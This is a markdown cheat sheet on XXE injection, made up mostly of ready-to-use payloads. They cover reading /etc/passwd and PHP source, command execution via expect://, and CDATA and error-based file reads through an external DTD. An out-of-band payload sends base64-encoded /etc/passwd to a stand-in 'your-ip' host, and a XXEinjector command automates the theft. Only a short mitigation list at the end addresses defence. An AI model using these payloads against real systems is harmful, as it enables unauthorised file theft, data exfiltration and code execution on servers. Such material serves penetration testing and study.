# XML External Entity (XXE) Injection

## Introduction

XXE vulnerabilities occur when an application parses user-supplied XML without disabling external entities. This allows attackers to read files, perform SSRF, trigger DoS, or, in specific cases, execute code.

---

## XML Basics

- XML may include **entities** and **DTDs** (internal / external).  
- External entities can reference local files or remote resources.

---

## Exploitation Techniques

### 1. Local File Disclosure

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

```bash
curl -X POST -H "Content-Type: application/xml" \
-d '<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>' \
http://target.com/vulnerable.php
```

---

### 2. Source Code Disclosure (PHP Filter)

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<root>&xxe;</root>
```

---

### 3. RCE via `expect://` (if enabled)

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<root>&xxe;</root>
```

---

### 4. CDATA Exfiltration (External DTD)

`xxe.dtd`:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Serve the DTD:

```bash
python3 -m http.server 8000
```

Payload:

```xml
<!DOCTYPE root [
 <!ENTITY % begin "<![CDATA[">
 <!ENTITY % file SYSTEM "file:///var/www/html/file.txt">
 <!ENTITY % end "]]>">
 <!ENTITY % xxe SYSTEM "http://your-ip:8000/xxe.dtd">
 %xxe;
]>
<root>&joined;</root>
```

---

### 5. Error-Based XXE (External DTD)

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExisting;/%file;'>">
```

Payload:

```xml
<!DOCTYPE root [
 <!ENTITY % remote SYSTEM "http://your-ip:8000/xxe.dtd">
 %remote;
 %error;
]>
```

---

### 6. Out-of-Band Exfiltration (OOB)

`xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://your-ip:8000/?c=%file;'>">
```

Payload:

```xml
<!DOCTYPE root [
 <!ENTITY % remote SYSTEM "http://your-ip:8000/xxe.dtd">
 %remote;
 %oob;
]>
<root>&content;</root>
```

---

### 7. Automated Exploitation (XXEinjector)

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

`request.txt` contains the raw request with `XXEINJECT`.

Run:

```bash
ruby XXEinjector.rb --host=your-ip --httpport=8000 --file=request.txt --path=/etc/passwd --oob=http --phpfilter
```

---

## Mitigation

* Disable DTDs / external entities in XML parsers
* Sanitize and validate XML input
* Use safe parsing libraries
* Apply least privilege
* Update XML libraries
* Use WAF rules for XML payload filtering
